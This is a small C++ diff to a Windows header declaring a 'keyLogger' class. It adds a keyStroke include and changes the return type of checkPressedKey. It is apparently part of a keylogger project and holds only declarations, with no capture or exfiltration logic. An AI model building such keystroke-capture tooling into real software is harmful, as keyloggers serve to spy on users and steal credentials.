@@ -1,6 +1,7 @@
 #pragma once
 #include <Windows.h>
 #include "keyProcessor.h"
+#include "keyStroke.h"
 
 #define NUM_OF_KEYS 255
 
@@ -12,6 +13,6 @@
 class keyLogger
 {
 public:
-	static char checkPressedKey();
+	static keyStroke checkPressedKey();
 };
 
